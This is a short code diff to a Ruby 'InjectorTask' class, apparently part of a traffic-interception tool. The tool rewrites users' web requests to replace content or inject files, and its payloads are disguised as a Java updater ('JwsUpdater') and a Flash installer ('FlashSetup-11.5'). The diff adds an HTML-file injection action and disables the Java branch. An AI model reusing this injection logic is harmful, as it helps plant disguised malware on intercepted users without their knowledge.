@@ -48,7 +48,7 @@ class InjectorTask
       redirect_url << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.probability} #{rule.resource}"
 
       case rule.action
-        when 'REPLACE'
+        when 'REPLACE', 'INJECT-HTML-FILE'
           vector_files[rule.action_param_name] = RCS::DB::GridFS.to_tmp(rule[:_grid])
           intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{rule.action_param_name} #{rule.resource}"
 
@@ -78,6 +78,7 @@ class InjectorTask
           end
           FileUtils.rm_rf(temp_zip)
 
+=begin
         when 'INJECT-HTML-JAVA'
           appname = 'JwsUpdater' + progressive.to_s
           intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"
@@ -105,6 +106,7 @@ class InjectorTask
             end
           end
           FileUtils.rm_rf(temp_zip)
+=end
 
         when 'INJECT-HTML-FLASH'
           appname = 'FlashSetup-11.5.' + progressive.to_s
